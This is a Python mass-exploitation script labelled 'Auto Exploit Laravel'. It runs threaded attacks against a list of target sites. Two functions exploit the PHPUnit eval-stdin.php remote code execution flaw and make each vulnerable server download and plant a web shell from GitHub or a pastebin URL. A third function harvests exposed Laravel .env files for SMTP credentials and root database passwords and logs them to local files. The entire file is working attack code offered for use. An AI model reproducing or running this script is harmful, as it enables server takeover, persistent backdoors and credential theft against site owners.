import requests as r
import sys
import os
from platform import system
import threading
import requests
import random
import datetime
import re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')
    


def rce(url):
    try:
        cekos = '<?php echo php_uname("a"); ?>'
        upshell = '<?php system("wget https://raw.githubusercontent.com/The404Hacking/b374k-mini/master/b374k.php -O unit.php"); ?>'
        url = url.strip()
        cek = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=cekos, timeout=50)
        if 'Linux' in cek.text:
            print(("[os] " + cek.text))
            open('phpunitvuln.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'+'\n')
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell)
            cekshell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/unit.php?ngacengan_su')
            if 'IDBTE4M' in cekshell.text:
                print(("[Shell Uploaded] " + url+'/vendor/phpunit/phpunit/src/Util/PHP/unit.php?ngacengan_su'))
                open('shell_phpunit.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/unit.php?ngacengan_su'+'\n')
            else:
                print(("[Shell not Uploaded]   : " + cekshell))
        else:
            print(("[Not Vuln]  : " + url))
    except:
        pass
        
def rce2(url):
    try:
        cekos = '<?php echo php_uname("a"); ?>'
        upshell = '<?php fwrite(fopen("raimu.php","w+"),file_get_contents("https://pastebin.com/raw/DWAYZwk5")); ?>'
        url = url.strip()
        cek = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=cekos, timeout=50)
        if 'Linux' in cek.text:
            print(("[os] " + cek.text))
            open('phpunitvuln.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'+'\n')
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell)
            cekshell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/raimu.php?ngacengan_su')
            if 'IDBTE4M' in cekshell.text:
                print(("[Shell Uploaded] " + url+'/vendor/phpunit/phpunit/src/Util/PHP/raimu.php?ngacengan_su'))
                open('shell_phpunit2.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/raimu.php?ngacengan_su'+'\n')
            else:
                print(("[Shell not Uploaded]  : " + url))
        else:
            print(("[Not Vuln]  : " + url))
    except:
        pass
   
def getsmtp(url):

	try:
		eNv = "{}/.env".format(url)

		headers = {
		    'Connection': 'keep-alive',
		    'Cache-Control': 'max-age=0',
		    'Upgrade-Insecure-Requests': '1',
		    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		    'Accept-Encoding': 'gzip, deflate',
		    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
		}

		rsmTP = requests.get(eNv, headers=headers, allow_redirects=True, timeout=50)

		if "mailtrap.io" in rsmTP.text:

			print("\033[1;31;40m")

			print("[ - ] NOT FOUND SMTP [ - ] \n")

		elif rsmTP.status_code == 200:
			
			if "APP_NAME" in rsmTP.text:
				
				open('envfound.txt', 'a').write(eNv + '\n')

			print("\033[1;32;40m")

			if "MAIL_HOST" in rsmTP.text:

				SMTP = re.findall('MAIL_HOST=(.*)', rsmTP.text)

				PORT = re.findall('MAIL_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('MAIL_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('MAIL_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				else:

					print("[ + ] FOUND SMTP [ + ]")

					print("\n= = = = = = = = = = = = = = = = = = = = = = = =")

					print(("SMTP HOST       => {}".format(SMTP[0])))

					print(("SMTP PORT       => {}".format(PORT[0])))

					print(("SMTP USERNAME   => {}".format(USERNAME[0])))

					print(("SMTP PASSWORD   => {}".format(PASSWORD[0])))

					print(("SMTP ENCRYPTION => {}".format(MENCRYPTION[0])))

					print("= = = = = = = = = = = = = = = = = = = = = = = =")

					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\n')



			elif "SMTP_HOST" in rsmTP.text:

				SMTP = re.findall('SMTP_HOST=(.*)', rsmTP.text)

				PORT = re.findall('SMTP_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('SMTP_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('SMTP_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				else:

					print("\n= = = = = = = = = = = = = = = = = = = = = = = =")

					print(("SMTP HOST       => {}".format(SMTP[0])))

					print(("SMTP PORT       => {}".format(PORT[0])))

					print(("SMTP USERNAME   => {}".format(USERNAME[0])))

					print(("SMTP PASSWORD   => {}".format(PASSWORD[0])))

					print(("SMTP ENCRYPTION => {}".format(MENCRYPTION[0])))

					print("= = = = = = = = = = = = = = = = = = = = = = = =")

					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\n')

			elif "mailtrap.io" in rsmTP.text:

				print("\033[1;31;40m")

				print("[ - ] NOT FOUND SMTP [ - ] \n")

			elif "DB_USERNAME=root" in rsmTP.text:

				ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)

				ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)

				print("[ + ] Maybe you can get VPS / DATABASE [+]")
				
				open('VPS.txt', 'a').write('HOSTS : ' + url + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n')

		

		elif rsmTP.status_code == 302:
			
			if "APP_NAME" in rsmTP.text:
				
				open('envfound.txt', 'a').write(eNv + '\n')

			if "MAIL_HOST" in rsmTP.text:

				SMTP = re.findall('MAIL_HOST=(.*)', rsmTP.text)

				PORT = re.findall('MAIL_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('MAIL_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('MAIL_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				else:

					print("[ + ] FOUND SMTP [ + ]")

					print("\n= = = = = = = = = = = = = = = = = = = = = = = =")

					print(("SMTP HOST       => {}".format(SMTP[0])))

					print(("SMTP PORT       => {}".format(PORT[0])))

					print(("SMTP USERNAME   => {}".format(USERNAME[0])))

					print(("SMTP PASSWORD   => {}".format(PASSWORD[0])))

					print(("SMTP ENCRYPTION => {}".format(MENCRYPTION[0])))

					print("= = = = = = = = = = = = = = = = = = = = = = = =")

					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\n')
					



			elif "SMTP_HOST" in rsmTP.text:

				SMTP = re.findall('SMTP_HOST=(.*)', rsmTP.text)

				PORT = re.findall('SMTP_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('SMTP_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('SMTP_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print("[ - ] NOT FOUND SMTP [ - ] \n")

				else:

					print("[ + ] FOUND SMTP [ + ]")

					print("\n= = = = = = = = = = = = = = = = = = = = = = = =")

					print(("SMTP HOST       => {}".format(SMTP[0])))

					print(("SMTP PORT       => {}".format(PORT[0])))

					print(("SMTP USERNAME   => {}".format(USERNAME[0])))

					print(("SMTP PASSWORD   => {}".format(PASSWORD[0])))

					print(("SMTP ENCRYPTION => {}".format(MENCRYPTION[0])))

					print("= = = = = = = = = = = = = = = = = = = = = = = =")

					open('SMTP.txt', 'a').write('SMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n')


			elif "DB_USERNAME=root" in rsmTP.text:

				ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)

				ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)

				print("[ + ] Maybe you can get VPS / DATABASE [+]")

				open('VPS.txt', 'a').write('HOSTS : ' + url + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n')

		else:

			print("[ - ] CAN'T FOUND BUG [ - ]")

	except:

		pass
def robot(url):
	try:
		rce(url)
		rce2(url)
		getsmtp(url)
	except:
		pass
		
def main():
    list = open(sys.argv[1], 'r').readlines()
    try:
        ThreadPool = Pool(50)
        ThreadPool.map(robot, list)
    except:
        pass
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Auto Exploit Laravel by Fallaga Team respect all hacker from TN, PK ,DZ")
        print(("Usage : python " + sys.argv[0] + " list.txt"))
    else:
        main()